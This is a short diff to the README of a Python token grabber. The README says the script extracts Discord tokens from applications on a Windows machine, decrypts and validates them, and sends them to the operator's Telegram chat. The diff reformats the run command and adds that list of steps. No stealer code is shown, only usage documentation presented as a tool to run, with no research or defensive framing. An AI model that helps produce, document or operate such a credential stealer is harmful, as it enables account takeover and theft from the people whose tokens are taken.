@@ -54,4 +54,10 @@ This Python script extracts Discord tokens from various applications on a Window
 
 2. **Run the Script:**
 
-- python main.py
+```bash
+python main.py
+```
+
+- It will:Search for tokens in supported applications.
+  Decrypt and validate them.
+  Send data to your Telegram chat.
